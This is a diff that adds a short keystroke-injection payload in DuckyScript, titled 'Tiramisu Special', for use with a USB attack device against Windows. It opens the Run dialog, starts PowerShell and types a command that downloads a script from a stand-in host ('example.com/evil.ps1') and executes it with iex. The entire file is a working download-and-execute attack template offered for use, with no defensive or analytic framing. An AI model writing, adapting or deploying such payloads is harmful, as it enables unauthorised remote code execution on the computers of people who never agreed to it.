@@ -1,0 +1,14 @@
+REM TITLE Tiramisu Special
+REM AUTHOR Poly
+REM OS Windows
+DELAY 500
+WINDOWS r
+DELAY 300
+STRING powershell
+DELAY 400
+ENTER
+DELAY 5000
+STRING iex (Invoke-WebRequest -Uri "https://example.com/evil.ps1").Content
+DELAY 100
+ENTER
+DELAY 3000
